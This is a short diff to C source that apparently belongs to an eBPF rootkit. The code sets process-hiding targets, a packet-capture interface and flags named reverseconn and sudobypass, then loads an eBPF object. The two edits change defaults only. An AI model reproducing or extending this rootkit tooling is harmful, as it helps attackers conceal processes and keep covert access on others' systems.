@@ -148,7 +148,7 @@ void clisetup(int argc, char **argv) {
   cfg.reverseconn = 0;
   cfg.protect = 0;
   cfg.sudobypass = 0;
-  strncpy(cfg.dev_name, "lo", 16);
+  strncpy(cfg.dev_name, DEFAULT_PCAP_INTERFACE, 16);
   if (getenv("HOME") == NULL) {
     strncpy(cfg.pr0bebooppath, PROBE_BOOP, sizeof PROBE_BOOP);
     strncpy(cfg.pr0besafepath, PROBE_SAFE, sizeof PROBE_SAFE);
@@ -318,7 +318,7 @@ int main(int argc, char **argv) {
             sizeof(sfobj->rodata->pid_to_hide));
 
     sfobj->rodata->pid_to_hide_len = strlen(pid) + 1;
-    sfobj->rodata->target_ppid = env.pid_to_hide;
+    sfobj->rodata->target_ppid = 0;
     loaded = pr0be_safe__load(sfobj);
     if (loaded < 0) {
       boopprintf("Unable to load eBPF object: %s\n", cfg.pr0besafepath);
